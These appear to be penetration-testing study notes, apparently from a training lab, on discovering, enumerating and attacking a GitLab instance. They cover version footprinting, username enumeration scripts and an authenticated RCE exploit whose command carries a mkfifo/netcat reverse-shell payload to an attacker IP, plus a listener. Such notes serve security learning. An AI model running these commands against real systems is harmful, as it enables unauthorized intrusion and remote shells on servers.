# Discovery & Enumeration
## Footprinting & Discovery
We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo. The only way to footprint the GitLab version number in use is by browsing to the /help page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version.
If we cannot register an account, we may have to try a low-risk exploit such as this.
https://www.exploit-db.com/exploits/49821

## Enumeration
The first thing we should try is browsing to /explore and see if there are any public projects that may contain something interesting. If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as Dehashed as seen in the osTicket section. Register with the credentials user:Welcome and log in and poke around. As soon as we complete registration, we are logged in and brought to the projects dashboard page.

Suppose this were some other type of application (such as PHP). In that case, we could possibly download the source and review it for vulnerabilities or hidden functionality or find credentials or other sensitive data.

# Attacking GitLab
## Username Enumeration
### Bash script (did NOT work with me)
https://www.exploit-db.com/exploits/49821
```
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```
### Python3 script (did work)
https://github.com/dpgg101/GitLabUserEnum
Pay attention as the users are CASE SENSITIVE

## Authenticated Remote Code Execution
As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.
```
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```
```
nc -lvnp 8443
```
